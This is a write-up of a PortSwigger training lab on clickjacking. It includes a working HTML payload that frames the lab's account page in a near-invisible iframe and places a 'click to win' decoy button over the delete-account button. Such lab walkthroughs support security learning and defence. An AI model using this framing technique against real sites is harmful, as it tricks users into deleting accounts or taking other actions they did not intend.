https://portswigger.net/web-security/clickjacking/lab-basic-csrf-protected



This lab contains login functionality and a delete account button that is protected by a CSRF token. A user will click on elements that display the word "click" on a decoy website.

To solve the lab, craft some HTML that frames the account page and fools the user into deleting their account. The lab is solved when the account is deleted.

You can log in to your own account using the following credentials: wiener:peter



1) we can see on our exploit server that is possible to include the website into a iframe
    <iframe src="https://***************LAB-ID******************.web-security-academy.net/my-account">
	</iframe>

so we can try to force a user to click on delete account including the legit website under a malicious page that contains a button over the delete button



we import the vulnerable website with an iframe and we put over it a malicious layer.
The victim clicking on the button click to win will click the vulnerable website delete account.



<html>

<head>
	<style>
		#target_website {
			position:relative;
			width:1000px;
			height:1000px;
			opacity:0.00001;
			z-index:2;
			}
		#decoy_website {
			position:absolute;
			width:300px;
			height:400px;
			z-index:1;
                        left: 80px;
                        top: 510px;
			}
	</style>
</head>
<body>
	<div id="decoy_website">
                <button> click to win </button>
	</div>
	<iframe id="target_website" src="https://***************LAB-ID******************.web-security-academy.net/my-account">
	</iframe>
</body>

</html>
